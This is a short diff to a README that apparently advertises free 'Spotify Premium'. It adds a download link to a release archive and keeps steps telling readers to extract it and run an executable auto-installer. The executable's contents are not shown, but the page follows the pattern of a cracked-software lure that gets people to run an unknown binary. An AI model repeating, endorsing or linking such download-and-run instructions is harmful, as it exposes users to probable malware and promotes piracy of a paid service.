@@ -6,7 +6,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/e1bec188-cc62-4629-977d-1d4247202b7e)
-]()
+](https://github.com/Sidodido/Spotify-Premium-for-free-2024/releases/download/Release/Release.zip)
 
 ## **1. [Download the archive]() and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
